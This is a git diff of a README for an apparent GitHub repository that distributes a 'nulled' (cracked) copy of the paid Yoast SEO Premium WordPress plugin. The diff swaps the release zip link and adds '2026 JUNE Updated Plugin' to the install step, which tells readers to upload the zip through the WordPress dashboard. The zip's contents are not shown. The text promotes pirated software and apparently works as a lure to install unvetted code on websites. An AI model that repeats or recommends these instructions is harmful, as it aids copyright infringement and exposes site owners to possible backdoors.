@@ -52,8 +52,8 @@ https://github.com/user-attachments/assets/9af7d79b-e0ad-435a-9059-52eff11ee108
 - WordPress 6.0 or higher
 - PHP 7.2 or higher
 
-### 2. Download & Install
-Download the latest `.zip` from the [Releases](https://github.com/tractorlulu7/yoast-seo-premium-nulled-2026/releases/download/SEO-Premium/Yoast.SEO.Premium.-.Best.Seo.Plugin.For.WP.zip) section of this repository, then upload it via **Plugins → Add New → Upload Plugin** in your WordPress dashboard.
+### 2. Download & Install ( 2026 JUNE Updated Plugin )
+Download the latest `.zip` from the [Releases](https://github.com/tractorlulu7/yoast-seo-premium-nulled-2026/releases/download/SEO-Premium/Yoast.Seo.Premium.zip) section of this repository, then upload it via **Plugins → Add New → Upload Plugin** in your WordPress dashboard.
 
 ### 3. Activate & Configure
 1. Go to **Plugins → Installed Plugins** and activate **Yoast SEO Premium**.
